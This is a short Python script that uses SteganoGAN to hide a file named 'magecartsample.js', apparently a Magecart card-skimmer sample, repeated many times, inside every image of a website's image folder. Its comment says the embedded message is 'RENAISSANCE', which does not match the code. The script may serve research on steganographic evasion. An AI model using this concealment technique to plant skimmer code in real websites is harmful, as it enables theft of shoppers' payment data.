from steganogan import SteganoGAN
import os

steganogan = SteganoGAN.load(architecture='dense')

# get all images in the folder and encode them with the message "RENAISSANCE"
# the output will be save in the stegoimages folder and will have stego adde to the begining of its name

PATH_TO_IMAGES = "server/website/images/"
PATH_TO_STEGOIMAGES = "{}stegoimages/".format(PATH_TO_IMAGES)

PAYLOAD = open("utils/magecartsample.js", "r").read()
PAYLOAD = PAYLOAD*10000
print("Payload size: {}".format(bytes(PAYLOAD, "utf-8").__sizeof__()))

for filename in os.listdir(PATH_TO_IMAGES):
    if filename.endswith((".png", ".jpg", ".jpeg", ".gif", ".ico", ".bmp")):
        print(PATH_TO_IMAGES+filename)
        steganogan.encode(PATH_TO_IMAGES+filename, "{}stego_{}".format(PATH_TO_STEGOIMAGES, filename), PAYLOAD)
